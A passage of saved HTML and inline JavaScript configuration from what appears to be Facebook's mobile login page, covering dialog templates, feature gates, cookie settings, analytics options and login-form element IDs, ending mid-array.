        <div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea">
          <div class="container">
            <div class="image"></div>
            <div class="message" data-sigil="error-message"></div>
            <a class="link" data-sigil="MPageError:retry">Try Again</a>
          </div>
        </div>
      </div>
    </div>
    <div id="static_templates">
      <div class="mDialog" id="modalDialog" style="display:none" data-sigil=" context-layer-root" data-autoid="autoid_1">
        <div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">
          <div class="_7om2 _52we">
            <div class="_5s61">
              <div class="_52z7">
                <button type="submit" value="Cancel" class="cancelButton btn btnD bgb mfss touchable" id="u_0_a_wM" data-sigil="dialog-cancel-button">Cancel</button>
                <button type="submit" value="Back" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="Back" id="u_0_b_PX" data-sigil="dialog-back-button">
                  <i class="img sp_lb_GJ13ifiY sx_2fc28b" style="margin-top: 2px;"></i>
                </button>
              </div>
            </div>
            <div class="_4g34">
              <div class="_52z6">
                <div class="_50l4 mfsl fcw" id="m-future-page-header-title" role="heading" tabindex="0" data-sigil="m-dialog-header-title dialog-title">Loading...</div>
              </div>
            </div>
            <div class="_5s61">
              <div class="_52z8" id="modalDialogHeaderButtons"></div>
            </div>
          </div>
        </div>
        <div class="modalDialogView" id="modalDialogView"></div>
        <div class="_5v5d _5v5e fcg" id="dialogSpinner">
          <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_9_ch" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Loading...
        </div>
      </div>
    </div>
    <script id="u_0_i_Br" crossorigin="anonymous" src="https://static.xx.fbcdn.net/rsrc.php/v3imlz4/yG/l/en_GB/4U3yd2j4koQ.js?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="58kqqKw" nonce=""></script>
    <script id="u_0_j_0j" nonce="">
      requireLazy(["HasteSupportData"], function(m) {
        m.handle({
          "gkxData": {
            "5241": {
              "result": true,
              "hash": "AT7o1bCQPGpf3ShEA7k"
            },
            "5919": {
              "result": false,
              "hash": "AT6PGptIPUYH051B-ws"
            },
            "676920": {
              "result": false,
              "hash": "AT497IX4gOFG8gZed9g"
            },
            "708253": {
              "result": false,
              "hash": "AT5n4hBL3YTMnQWtjtw"
            },
            "996940": {
              "result": false,
              "hash": "AT7opYuEGy3sjG1a3a8"
            },
            "1263340": {
              "result": false,
              "hash": "AT5bwizWgDaFQudmRPU"
            }
          }
        })
      });
      requireLazy(["TimeSliceImpl", "ServerJS"], function(TimeSlice, ServerJS) {
        (new ServerJS()).handle({
          "define": [
            ["CometPersistQueryParams", [], {
              "relative": {},
              "domain": {}
            }, 6231],
            ["BigPipeExperiments", [], {
              "link_images_to_pagelets": false,
              "enable_bigpipe_plugins": false
            }, 907],
            ["BootloaderConfig", [], {
              "deferBootloads": false,
              "jsRetries": [200, 500],
              "jsRetryAbortNum": 2,
              "jsRetryAbortTime": 5,
              "silentDups": false,
              "hypStep4": false,
              "phdOn": false,
              "btCutoffIndex": 582
            }, 329],
            ["CSSLoaderConfig", [], {
              "timeout": 5000,
              "modulePrefix": "BLCSS:",
              "loadEventSupported": true
            }, 619],
            ["CurrentCommunityInitialData", [], {}, 490],
            ["CurrentUserInitialData", [], {
              "ACCOUNT_ID": "0",
              "USER_ID": "0",
              "NAME": "",
              "SHORT_NAME": null,
              "IS_BUSINESS_PERSON_ACCOUNT": false,
              "HAS_SECONDARY_BUSINESS_PERSON": false,
              "IS_FACEBOOK_WORK_ACCOUNT": false,
              "IS_MESSENGER_ONLY_USER": false,
              "IS_DEACTIVATED_ALLOWED_ON_MESSENGER": false,
              "IS_MESSENGER_CALL_GUEST_USER": false,
              "IS_WORK_MESSENGER_CALL_GUEST_USER": false,
              "APP_ID": "412378670482",
              "IS_BUSINESS_DOMAIN": false
            }, 270],
            ["ErrorDebugHooks", [], {
              "SnapShotHook": null
            }, 185],
            ["ISB", [], {}, 330],
            ["LSD", [], {
              "token": "AVom8wp145k"
            }, 323],
            ["MRequestConfig", [], {
              "dtsg": {
                "token": "NAcNeZoo9WnzUy6cfVv-3bWvKTMUzL7UQ-dECvCm2bWI2FAX5_b2WOA:0:0",
                "valid_for": 86400,
                "expire": 1655304755
              },
              "dtsg_ag": {
                "token": "AQwEoS_B1EPGkMKWUS_fs6iVYusNTscjIT5EMNj9hpAOIDwO:0:0",
                "valid_for": 604800,
                "expire": 1655823155
              },
              "lsd": "AVom8wp145k",
              "checkResponseOrigin": true,
              "checkResponseToken": true,
              "cleanFinishedRequest": false,
              "cleanFinishedPrefetchRequests": false,
              "ajaxResponseToken": {
                "secret": "NX_x7rb8g1qM582h8TFraU7wlQjMREFl",
                "encrypted": "AYnr0IF5hULc7q6WZBCa3_9DLTJGl2q0NtVjCVQtSKVeRvqyRR2cy9IMxGvqEz5xmwabNv1CJsXhHO37DajKU4oBGqBJnN8DTg55KcSqR1HNlw"
              }
            }, 51],
            ["ServerNonce", [], {
              "ServerNonce": "WhPtjNPOU2NVpTsKQqu5dD"
            }, 141],
            ["SiteData", [], {
              "server_revision": 1005679812,
              "client_revision": 1005679812,
              "tier": "",
              "push_phase": "C3",
              "pkg_cohort": "BP:mtouch_pkg",
              "haste_session": "19157.BP:mtouch_pkg.2.0.0.0.",
              "pr": 1,
              "haste_site": "mobile",
              "manifest_base_uri": "https:\/\/static.xx.fbcdn.net",
              "manifest_origin": null,
              "be_one_ahead": false,
              "is_rtl": false,
              "is_comet": false,
              "is_experimental_tier": false,
              "is_jit_warmed_up": true,
              "hsi": "7109108704229205316-0",
              "semr_host_bucket": "5",
              "bl_hash_version": 2,
              "skip_rd_bl": true,
              "comet_env": 0,
              "wbloks_env": false,
              "spin": 0,
              "__spin_r": 1005679812,
              "__spin_b": "trunk",
              "__spin_t": 1655218355,
              "vip": "2a03:2880:f15c:83:face:b00c:0:25de"
            }, 317],
            ["SprinkleConfig", [], {
              "param_name": "jazoest",
              "version": 2,
              "should_randomize": false
            }, 2111],
            ["PromiseUsePolyfillSetImmediateGK", [], {
              "www_always_use_polyfill_setimmediate": false
            }, 2190],
            ["KSConfig", [], {
              "killed": {
                "__set": ["MOBILIZER_SELF_SERVE_OWNERSHIP_RESOLVER", "MLHUB_FLOW_AUTOREFRESH_SEARCH", "NEKO_DISABLE_CREATE_FOR_SAP", "EO_DISABLE_SYSTEM_SERIAL_NUMBER_FREE_TYPING_IN_CPE_NON_CLIENT", "MOBILITY_KILL_OLD_VISIBILITY_POSITION_SETTING", "WORKPLACE_DISPLAY_TEXT_EVIDENCE_REPORTING", "BUSINESS_INVITE_FLOW_WITH_SELLER_PROFILE", "BUY_AT_UI_LINE_DELETE", "BUSINESS_GRAPH_SETTING_APP_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_BU_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_ESG_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_PRODUCT_CATALOG_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_SESG_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_WABA_ASSIGNED_USERS_NEW_API", "ADS_PLACEMENT_FIX_PUBLISHER_PLATFORMS_MUTATION", "FORCE_FETCH_BOOSTED_COMPONENT_AFTER_ADS_CREATION", "VIDEO_DIMENSIONS_FROM_PLAYER_IN_UPLOAD_DIALOG", "SNIVY_GROUP_BY_EVENT_TRACE_ID_AND_NAME", "ADS_STORE_VISITS_METRICS_DEPRECATION", "DYNAMIC_ADS_SET_CATALOG_AND_PRODUCT_SET_TOGETHER", "AD_DRAFT_ENABLE_SYNCRHONOUS_FRAGMENT_VALIDATION", "SEPARATE_MESSAGING_COMACTIVITY_PAGE_PERMS", "LAB_NET_NEW_UI_RELEASE", "POCKET_MONSTERS_CREATE", "POCKET_MONSTERS_DELETE", "SRT_BANZAI_SRT_CORE_LOGGER", "SRT_BANZAI_SRT_MAIN_LOGGER", "WORKPLACE_PLATFORM_SECURE_APPS_MAILBOXES", "POCKET_MONSTERS_UPDATE_NAME", "IC_DISABLE_MERGE_TOOL_FEED_CHECK_FOR_REPLACE_SCHEDULE", "ADS_EPD_IMPACTED_ADVERTISER_MIGRATE_XCONTROLLER", "RECRUITING_CANDIDATE_PORTAL_ACCOUNT_DELETION_CARD", "BIZ_INBOX_POP_UP_TIP_NAVIGATION_BUG_FIX", "MBS_CHANGE_NAME_TO_CREATOR_MARKETPLACE"]
              },
              "ko": {
                "__set": ["8H4bQmEiuLT", "3OsLvnSHNTt", "1G7wJ6bJt9K", "9NpkGYwzrPG", "3oh5Mw86USj", "8NAceEy9JZo", "7FOIzos6XJX", "rf8JEPGgOi", "4j36SVzvP3w", "4NSq3ZC4ScE", "53gCxKq281G", "3yzzwBY7Npj", "1onzIv0jH6H", "8PlKuowafe8", "1ntjZ2zgf03", "4SIH2GRVX5W", "2dhqRnqXGLQ", "2WgiNOrHVuC", "amKHb4Cw4WI", "5mNEXob0nTj", "8rDvN9vWdAK", "5BdzWGmfvrA", "DDZhogI19W", "acrJTh9WGdp", "1oOE64fL4wO", "9Gd8qgRxn8z", "MPMaqnqZ9c", "5XCz1h9Iaw3", "7r6mSP7ofr2", "6DGPLrRdyts", "aWxCyi1sEC7", "9kCSDzzr8fu", "awYA7fn2Bse", "kLhRIXpAOK"]
              }
            }, 2580],
            ["JSErrorLoggingConfig", [], {
              "appId": 412378670482,
              "extra": [],
              "reportInterval": 50,
              "sampleWeight": null,
              "sampleWeightKey": "__jssesw",
              "projectBlocklist": []
            }, 2776],
            ["ImmediateImplementationExperiments", [], {
              "prefer_message_channel": true
            }, 3419],
            ["UriNeedRawQuerySVConfig", [], {
              "uris": ["dms.netmng.com", "doubleclick.net", "r.msn.com", "watchit.sky.com", "graphite.instagram.com", "www.kfc.co.th", "learn.pantheon.io", "www.landmarkshops.in", "www.ncl.com", "s0.wp.com", "www.tatacliq.com", "bs.serving-sys.com", "kohls.com", "lazada.co.th", "xg4ken.com", "technopark.ru", "officedepot.com.mx", "bestbuy.com.mx", "booking.com", "nibio.no"]
            }, 3871],
            ["RunGatingConfig", [], {
              "shouldUseBrowserUnload": true
            }, 3914],
            ["InitialCookieConsent", [], {
              "deferCookies": false,
              "initialConsent": {
                "__set": [1, 2]
              },
              "noCookies": false,
              "shouldShowCookieBanner": false
            }, 4328],
            ["TrustedTypesConfig", [], {
              "useTrustedTypes": false,
              "reportOnly": false
            }, 4548],
            ["WebConnectionClassServerGuess", [], {
              "connectionClass": "EXCELLENT"
            }, 4705],
            ["BootloaderEndpointConfig", [], {
              "debugNoBatching": false,
              "endpointURI": "https:\/\/m.facebook.com\/ajax\/bootloader-endpoint\/"
            }, 5094],
            ["CookieConsentIFrameConfig", [], {
              "consent_param": "FQAREhIA.ARaGdJsdXbHfc8YRxuUPXf9eF3P4hLQ3D25lb8J_fLy5rgyR",
              "allowlisted_iframes": []
            }, 5540],
            ["cr:696703", [], {
              "__rc": [null, "Aa1V53nIHYzVYK0NWHnvSOAPQJV8B4ncgLXS4k_FiAO8trOb5wrpS4HHEPezKAouL-R97tf_FBM6MlH8OxMI6IKBr_M"]
            }, -1],
            ["cr:717822", ["TimeSliceImpl"], {
              "__rc": ["TimeSliceImpl", "Aa1V53nIHYzVYK0NWHnvSOAPQJV8B4ncgLXS4k_FiAO8trOb5wrpS4HHEPezKAouL-R97tf_FBM6MlH8OxMI6IKBr_M"]
            }, -1],
            ["cr:729414", [], {
              "__rc": [null, "Aa26OE7I1JOllV7UY870j8eIbIRijT-sfs4UkPHzyVTypVqA6RurUdmrkHoEtqdbzkeOBNvbxLSDZhXPhv9ZKBhn"]
            }, -1]
          ],
          "require": [
            ["MPrelude"],
            ["VisualCompletionGating"],
            ["RequireDeferredReference", "unblock", [],
              [
                ["VisualCompletionGating"], "sd"
              ]
            ],
            ["RequireDeferredReference", "unblock", [],
              [
                ["VisualCompletionGating"], "css"
              ]
            ]
          ]
        });
      });
    </script>
    <script>
      now_inl = (function() {
        var p = window.performance;
        return p && p.now && p.timing && p.timing.navigationStart ? function() {
          return p.now() + p.timing.navigationStart
        } : function() {
          return new Date().getTime()
        };
      })();
      window.__bigPipeFR = now_inl();
    </script>
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yu/l/0,cross/fydrH0sdg8k.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous">
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yZ/l/0,cross/n9g6Q0kZdhT.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous">
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yk/r/J-zOLqpAwWd.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="">
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3imlz4/yG/l/en_GB/4U3yd2j4koQ.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="">
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yJ/l/0,cross/HNgZrBbH51G.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous">
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/ym/r/1c-S99MMZKC.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="">
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yB/r/2jr_tFUjDMy.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="">
    <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yl/r/ilMFccLWbov.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="">
    <script>
      window.__bigPipeCtor = now_inl();
      requireLazy(["BigPipe"], function(BigPipe) {
        define("__bigPipe", [], window.bigPipe = new BigPipe({
          "forceFinish": true,
          "config": {
            "flush_pagelets_asap": true,
            "dispatch_pagelet_replayable_actions": false
          }
        }));
      });
    </script>
    <script nonce="">
      (function() {
        var n = now_inl();
        requireLazy(["__bigPipe"], function(bigPipe) {
          bigPipe.beforePageletArrive("first_response", n);
        })
      })();
    </script>
    <script nonce="">
      requireLazy(["__bigPipe"], (function(bigPipe) {
        bigPipe.onPageletArrive({
          displayResources: ["+jAKWHf", "MoYpVB9", "M5XDl+E", "58kqqKw", "F5kNww5", "vF0qXZY", "bJ922yg", "FJqL2Al"],
          id: "first_response",
          phase: 0,
          last_in_phase: true,
          tti_phase: 0,
          all_phases: [63],
          jsmods: {
            define: [
              ["CookieDomain", [], {
                domain: "facebook.com"
              }, 6421],
              ["IntlVariationHoldout", [], {
                disable_variation: false
              }, 6533],
              ["CookieCoreConfig", [], {
                c_user: {
                  s: "None"
                },
                cppo: {
                  t: 86400,
                  s: "None"
                },
                dpr: {
                  t: 604800,
                  s: "None"
                },
                fbl_ci: {
                  t: 31536000,
                  s: "None"
                },
                fbl_cs: {
                  t: 31536000,
                  s: "None"
                },
                fbl_st: {
                  t: 31536000,
                  s: "Strict"
                },
                i_user: {
                  s: "None"
                },
                locale: {
                  t: 604800,
                  s: "None"
                },
                m_pixel_ratio: {
                  t: 604800,
                  s: "None"
                },
                noscript: {
                  s: "None"
                },
                presence: {
                  t: 2592000,
                  s: "None"
                },
                sfau: {
                  s: "None"
                },
                usida: {
                  s: "None"
                },
                vpd: {
                  t: 5184000,
                  s: "Lax"
                },
                wd: {
                  t: 604800,
                  s: "Lax"
                },
                "x-referer": {
                  s: "None"
                },
                "x-src": {
                  t: 1,
                  s: "None"
                }
              }, 2104],
              ["FbtQTOverrides", [], {
                overrides: {}
              }, 551],
              ["FbtResultGK", [], {
                shouldReturnFbtResult: true,
                inlineMode: "NO_INLINE"
              }, 876],
              ["IntlPhonologicalRules", [], {
                meta: {
                  "/_B/": "([.,!?\\s]|^)",
                  "/_E/": "([.,!?\\s]|$)"
                },
                patterns: {
                  "/\u0001(.*)('|&#039;)s\u0001(?:'|&#039;)s(.*)/": "\u0001$1$2s\u0001$3",
                  "/_\u0001([^\u0001]*)\u0001/": "javascript"
                }
              }, 1496],
              ["IntlViewerContext", [], {
                GENDER: 3,
                regionalLocale: null
              }, 772],
              ["MJSEnvironment", [], {
                IS_APPLE_WEBKIT_IOS: false,
                IS_TABLET: false,
                IS_ANDROID: false,
                IS_CHROME: true,
                IS_FIREFOX: false,
                IS_WINDOWS_PHONE: false,
                IS_SAMSUNG_DEVICE: false,
                OS_VERSION: 10,
                PIXEL_RATIO: 1,
                BROWSER_NAME: "Chrome Desktop"
              }, 46],
              ["MLoadingIndicatorSigils", [], {
                ANIMATE: "m-loading-indicator-animate",
                ROOT: "m-loading-indicator-root"
              }, 279],
              ["NumberFormatConfig", [], {
                decimalSeparator: ".",
                numberDelimiter: ",",
                minDigitsForThousandsSeparator: 4,
                standardDecimalPatternInfo: {
                  primaryGroupSize: 3,
                  secondaryGroupSize: 3
                },
                numberingSystemData: null
              }, 54],
              ["UserAgentData", [], {
                browserArchitecture: "64",
                browserFullVersion: "102.0.0.0",
                browserMinorVersion: 0,
                browserName: "Chrome",
                browserVersion: 102,
                deviceName: "Unknown",
                engineName: "WebKit",
                engineVersion: "537.36",
                platformArchitecture: "64",
                platformName: "Windows",
                platformVersion: "10",
                platformFullVersion: "10"
              }, 527],
              ["ZeroCategoryHeader", [], {}, 1127],
              ["ZeroRewriteRules", [], {
                rewrite_rules: {},
                whitelist: {
                  "/hr/r": 1,
                  "/hr/p": 1,
                  "/zero/unsupported_browser/": 1,
                  "/zero/policy/optin": 1,
                  "/zero/optin/write/": 1,
                  "/zero/optin/legal/": 1,
                  "/zero/optin/free/": 1,
                  "/about/privacy/": 1,
                  "/about/privacy/update/": 1,
                  "/privacy/explanation/": 1,
                  "/zero/toggle/welcome/": 1,
                  "/zero/toggle/nux/": 1,
                  "/zero/toggle/settings/": 1,
                  "/fup/interstitial/": 1,
                  "/work/landing": 1,
                  "/work/login/": 1,
                  "/work/email/": 1,
                  "/ai.php": 1,
                  "/js_dialog_resources/dialog_descriptions_android.json": 0,
                  "/connect/jsdialog/MPlatformAppInvitesJSDialog/": 0,
                  "/connect/jsdialog/MPlatformOAuthShimJSDialog/": 0,
                  "/connect/jsdialog/MPlatformLikeJSDialog/": 0,
                  "/qp/interstitial/": 1,
                  "/qp/action/redirect/": 1,
                  "/qp/action/close/": 1,
                  "/zero/support/ineligible/": 1,
                  "/zero_balance_redirect/": 1,
                  "/zero_balance_redirect": 1,
                  "/zero_balance_redirect/l/": 1,
                  "/l.php": 1,
                  "/lsr.php": 1,
                  "/ajax/dtsg/": 1,
                  "/checkpoint/block/": 1,
                  "/exitdsite": 1,
                  "/zero/balance/pixel/": 1,
                  "/zero/balance/": 1,
                  "/zero/balance/carrier_landing/": 1,
                  "/zero/flex/logging/": 1,
                  "/tr": 1,
                  "/tr/": 1,
                  "/sem_campaigns/sem_pixel_test/": 1,
                  "/bookmarks/flyout/body/": 1,
                  "/zero/subno/": 1,
                  "/confirmemail.php": 1,
                  "/policies/": 1,
                  "/mobile/internetdotorg/classifier/": 1,
                  "/zero/dogfooding": 1,
                  "/xti.php": 1,
                  "/zero/fblite/config/": 1,
                  "/hr/zsh/wc/": 1,
                  "/ajax/bootloader-endpoint/": 1,
                  "/mobile/zero/carrier_page/": 1,
                  "/mobile/zero/carrier_page/education_page/": 1,
                  "/mobile/zero/carrier_page/feature_switch/": 1,
                  "/mobile/zero/carrier_page/settings_page/": 1,
                  "/aloha_check_build": 1,
                  "/upsell/zbd/softnudge/": 1,
                  "/mobile/zero/af_transition/": 1,
                  "/mobile/zero/af_transition/action/": 1,
                  "/mobile/zero/freemium/": 1,
                  "/mobile/zero/freemium/redirect/": 1,
                  "/mobile/zero/freemium/zero_fup/": 1,
                  "/privacy/policy/": 1,
                  "/privacy/center/": 1,
                  "/data/manifest/": 1,
                  "/4oh4.php": 1,
                  "/autologin.php": 1,
                  "/birthday_help.php": 1,
                  "/checkpoint/": 1,
                  "/contact-importer/": 1,
                  "/cr.php": 1,
                  "/legal/terms/": 1,
                  "/login.php": 1,
                  "/login/": 1,
                  "/mobile/account/": 1,
                  "/n/": 1,
                  "/remote_test_device/": 1,
                  "/upsell/buy/": 1,
                  "/upsell/buyconfirm/": 1,
                  "/upsell/buyresult/": 1,
                  "/upsell/promos/": 1,
                  "/upsell/continue/": 1,
                  "/upsell/h/promos/": 1,
                  "/upsell/loan/learnmore/": 1,
                  "/upsell/purchase/": 1,
                  "/upsell/promos/upgrade/": 1,
                  "/upsell/buy_redirect/": 1,
                  "/upsell/loan/buyconfirm/": 1,
                  "/upsell/loan/buy/": 1,
                  "/upsell/sms/": 1,
                  "/wap/a/channel/reconnect.php": 1,
                  "/wap/a/nux/wizard/nav.php": 1,
                  "/wap/appreg.php": 1,
                  "/wap/birthday_help.php": 1,
                  "/wap/c.php": 1,
                  "/wap/confirmemail.php": 1,
                  "/wap/cr.php": 1,
                  "/wap/login.php": 1,
                  "/wap/r.php": 1,
                  "/zero/datapolicy": 1,
                  "/a/timezone.php": 1,
                  "/a/bz": 1,
                  "/bz/reliability": 1,
                  "/r.php": 1,
                  "/mr/": 1,
                  "/reg/": 1,
                  "/registration/log/": 1,
                  "/terms/": 1,
                  "/f123/": 1,
                  "/expert/": 1,
                  "/experts/": 1,
                  "/terms/index.php": 1,
                  "/terms.php": 1,
                  "/srr/": 1,
                  "/msite/redirect/": 1,
                  "/fbs/pixel/": 1,
                  "/contactpoint/preconfirmation/": 1,
                  "/contactpoint/cliff/": 1,
                  "/contactpoint/confirm/submit/": 1,
                  "/contactpoint/confirmed/": 1,
                  "/contactpoint/login/": 1,
                  "/preconfirmation/contactpoint_change/": 1,
                  "/help/contact/": 1,
                  "/survey/": 1,
                  "/upsell/loyaltytopup/accept/": 1,
                  "/settings/": 1,
                  "/lite/": 1,
                  "/zero_status_update/": 1,
                  "/operator_store/": 1,
                  "/upsell/": 1,
                  "/wifiauth/login/": 1
                }
              }, 1478],
              ["CookieCoreLoggingConfig", [], {
                maximumIgnorableStallMs: 16.67,
                sampleRate: 9.7e-5,
                sampleRateClassic: 1.0e-10,
                sampleRateFastStale: 1.0e-8
              }, 3401],
              ["IntlNumberTypeConfig", [], {
                impl: "if (n === 1) { return IntlVariations.NUMBER_ONE; } else { return IntlVariations.NUMBER_OTHER; }"
              }, 3405],
              ["ServerTimeData", [], {
                serverTime: 1655218355449,
                timeOfRequestStart: 1655218355289.9,
                timeOfResponseStart: 1655218355289.9
              }, 5943],
              ["MobileAppDetect", [], {
                is_mobile_app: false,
                is_ads_manager_app: false,
                is_pages_manager: false,
                is_facebook_for_android: false,
                is_facebook_for_android_in_app_browser: false,
                is_android_faceweb: false,
                is_facebook_for_ios: false,
                is_instagram: false,
                is_messenger_for_android: false,
                is_messenger_for_ios: false,
                is_messenger_lite_for_android: false,
                is_messenger_lite_for_ios: false,
                is_wilde: false,
                is_kaios: false
              }, 1109],
              ["MWebStorageMonsterWhiteList", [], {
                whitelist: ["^CacheStorageVersion$", "^RTC_VIDEO_INPUT$", "^RTC_AUDIO_INPUT$", "^RTC_AUDIO_OUTPUT$", "^RTC_IS_AUDIO_ONLY$", "^RTC_NOISE_SUPPRESSION$", "^RTC_MUTE_STATE$", "^Session$", "^_oz_", "^_video_bandwidthEstimate$", "^Banzai$", "^bz", "^banzai\\:last_storage_flush$", "^falco_queue_", "^mutex", "^msys", "^Bandicoot\\:", "^imp_seq_num$", "^qe_switcher_nub_selection$", "^TabId$", "^sp_pi$", "^\\:userchooser\\:osessusers$", "^\\:userchooser\\:settings$", "^brands\\:console\\:config$", "^consoleEnabled$", "^__fb_messenger_desktop_presence_info$", "^vc_", "^_showMDevConsole$", "^ga_client_id$", "^_mswam_$", "^am_recently_used_filters\\:", "^am_image_size_cache$", "^ickt$", "^hb_timestamp$", "^signal_flush_timestamp$", "^last_fast_refresh$", "^_ctv_access_token$", "^_ctv_android_device_info$", "^_ctv_cast_access_token$", "^_ctv_casting_remote$", "^_ctv_console_log_viewer_on_full_screen_player_enabled$", "^_ctv_cookie_consent_displayed$", "^_ctv_debug_redux_logger_enabled$", "^_ctv_deviceUniqueIDFallback$", "^_ctv_gaming_consent_displayed$", "^_ctv_installed_app_player_debug_overlay_enabled$", "^_ctv_last_load_time_ms$", "^_ctv_locale$", "^_ctv_logged_out_constraints_sessions_count$", "^_ctv_reloadedDueToStaleApp$", "^_ctv_reloadedDueToUnrecoverableError$", "^_ctv_search_terms$", "^_ctv_tv_experiments$", "^_ctv_usedCloseAppFallback$", "^_ctv_user_sessions$", "^_ctv_video_debug_overlay_enabled$", "^_ctv_debug_rampart_server_number$", "^fx_did$", "^wa_lang_banner_dismissed$", "^bulletin_article_reader_onload_dialog_seen$", "^bulletin_session_attributes$", "^md_survey$", "^support_guest_chat$", "^comet_is_recent_profile_switch$", "^comet_console_position$", "^mw_exchange_vm$", "^has_seen_email_login_toast$"]
              }, 254],
              ["LinkshimHandlerConfig", [], {
                supports_meta_referrer: true,
                default_meta_referrer_policy: "origin-when-crossorigin",
                switched_meta_referrer_policy: "origin",
                non_linkshim_lnfb_mode: null,
                link_react_default_hash: "AT0fgdJIVHPNHfpRfwyp-63aTJZlLj7sPWBvWUYS_Hvg8VPpbPukmkeMUKOUcMtqnt6Cs4Howz_0OK6FOrgXkYDwPI1eKpYwepwu0BZNzO-10kO12U31Bo8fIO-RXcWmedLe0nIJmFIHpf8UHOn1BAbDtizg7SVbPhxr6g",
                untrusted_link_default_hash: "AT257SAvfvdgIluS1t4y8LfFo_ntbx0FWeYpMaSNR5dz0tIzwgn7QUrcdkM3ieyMSivC0eLyJVTCO6e0t-86JKGvHGEOQEBLn_vOAeM-V4r8x51_V30MrV44MUhn9ONpsQq6SCNp2y20sFxlNxDqZFC9W5WLU7qZskK7iQ",
                linkshim_host: "lm.facebook.com",
                linkshim_path: "/l.php",
                linkshim_enc_param: "h",
                linkshim_url_param: "u",
                use_rel_no_opener: true,
                always_use_https: true,
                onion_always_shim: true,
                middle_click_requires_event: true,
                www_safe_js_mode: "asynclazy",
                m_safe_js_mode: "MLynx_asynclazy",
                ghl_param_link_shim: false,
                click_ids: [],
                is_linkshim_supported: true,
                current_domain: "facebook.com",
                blocklisted_domains: ["ad.doubleclick.net", "ads-encryption-url-example.com", "bs.serving-sys.com", "ad.atdmt.com", "adform.net", "ad13.adfarm1.adition.com", "ilovemyfreedoms.com", "secure.adnxs.com"],
                is_mobile_device: false
              }, 27],
              ["MemoryLoggerConfigWebSitevarConfig", [], {
                measurement_interval_minutes: 5
              }, 5573],
              ["FWLoader", [], {}, 278],
              ["ImmediateActiveSecondsConfig", [], {
                sampling_rate: 0
              }, 423],
              ["MPageControllerGating", [], {
                shouldDeferUntilCertainNoRedirect: false,
                shouldReleaseFetcherLock: false,
                shouldLoadingScreenSetScriptPath: false,
                shouldRenderAsync404: false
              }, 2023],
              ["AnalyticsCoreData", [], {
                device_id: "$^|AcaNv6r8xAg7TaAdc8H0CHmt4a0emRSMQGbCN-hUw5QQrJvhXZ_D5RisyNQ5ulvImvFw6zl9z2rqWhYOEqiztSE2RrvAToMAHm82Xs2uzs7HIZKZSCZByYHnXVGnKIsk-Cd7aup0N68egCanD7recHYS1LN1bFU|fd.AcbJfGbLSkqfBXjhiQ2GEyrV9zjG0qpuGZQ4meJGCcnCCDX003_clIrveUxf1YLToyFMAoYoMWRI2Qnh7p1RX_GC",
                app_id: "412378670482",
                enable_bladerunner: false,
                enable_ack: true,
                push_phase: "C3",
                enable_observer: false,
                enable_dataloss_timer: false,
                enable_fallback_for_br: true,
                fix_br_init_rc: true
              }, 5237],
              ["cr:1642797", ["BanzaiBase"], {
                __rc: ["BanzaiBase", "Aa1V53nIHYzVYK0NWHnvSOAPQJV8B4ncgLXS4k_FiAO8trOb5wrpS4HHEPezKAouL-R97tf_FBM6MlH8OxMI6IKBr_M"]
              }, -1],
              ["cr:694370", ["requestIdleCallbackBlue"], {
                __rc: ["requestIdleCallbackBlue", "Aa1V53nIHYzVYK0NWHnvSOAPQJV8B4ncgLXS4k_FiAO8trOb5wrpS4HHEPezKAouL-R97tf_FBM6MlH8OxMI6IKBr_M"]
              }, -1],
              ["cr:692209", ["cancelIdleCallbackBlue"], {
                __rc: ["cancelIdleCallbackBlue", "Aa1V53nIHYzVYK0NWHnvSOAPQJV8B4ncgLXS4k_FiAO8trOb5wrpS4HHEPezKAouL-R97tf_FBM6MlH8OxMI6IKBr_M"]
              }, -1],
              ["MBanzaiConfig", [], {
                MAX_SIZE: 10000,
                MAX_WAIT: 30000,
                MIN_WAIT: null,
                RESTORE_WAIT: 30000,
                blacklist: ["time_spent"],
                disabled: false,
                gks: {
                  platform_oauth_client_events: true,
                  boosted_pagelikes: true
                },
                known_routes: ["artillery_javascript_actions", "artillery_javascript_trace", "artillery_logger_data", "logger", "falco", "gk2_exposure", "js_error_logging", "loom_trace", "marauder", "perfx_custom_logger_endpoint", "qex", "require_cond_exposure_logging", "sri_logger_data"],
                should_drop_unknown_routes: true,
                should_log_unknown_routes: false
              }, 32]
            ],
            elements: [
              ["__elem_de5177dd_0_0_Oe", "u_0_0_9x", 1],
              ["__elem_921b58ef_0_0_xD", "login_form", 2],
              ["__elem_e24cb174_0_0_gE", "m_login_password", 1],
              ["__elem_7216e2ae_0_2_rc", "u_0_1_Ev", 1],
              ["__elem_e03291d5_0_1_Ox", "u_0_2_Ff", 1],
              ["__elem_e03291d5_0_0_H/", "u_0_3_37", 1],
              ["__elem_7216e2ae_0_0_B3", "login_password_step_element", 1],
              ["__elem_8a020238_0_0_ZA", "forgot-password-link", 1],
